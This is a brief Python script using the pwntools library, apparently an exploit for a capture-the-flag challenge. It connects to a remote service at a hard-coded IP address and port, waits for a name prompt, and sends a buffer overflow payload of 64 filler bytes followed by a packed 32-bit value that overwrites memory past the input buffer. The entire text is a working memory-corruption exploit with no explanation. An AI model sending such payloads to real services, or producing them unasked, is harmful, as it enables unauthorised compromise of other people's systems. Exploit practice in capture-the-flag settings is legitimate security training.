from pwn import *

r = remote('61.28.237.24', 30203)

print(r.recvuntil('Please enter your name:'))
payload = b'a' * 64
payload += p32(0x66A44)
r.sendline(payload)
print(r.recvline())
print(r.recvline())